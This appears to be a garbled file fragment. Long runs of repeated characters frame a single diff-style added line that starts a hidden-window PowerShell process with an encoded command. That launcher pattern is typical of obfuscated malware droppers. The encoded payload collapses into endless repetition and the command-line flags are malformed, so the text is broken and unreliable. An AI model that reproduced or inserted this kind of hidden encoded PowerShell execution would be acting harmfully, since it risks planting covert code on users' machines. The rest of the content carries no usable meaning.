qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHqqAHqqAHqqAHqqAHqqAHqqAHqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+powershell -nop windows -hidden -nonenc JABAAAAAElEG8sAJICAMAPAGACWAgAZABQABwAAAEABAA84AGAZUAdABlAGAZAHAGAGABAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAG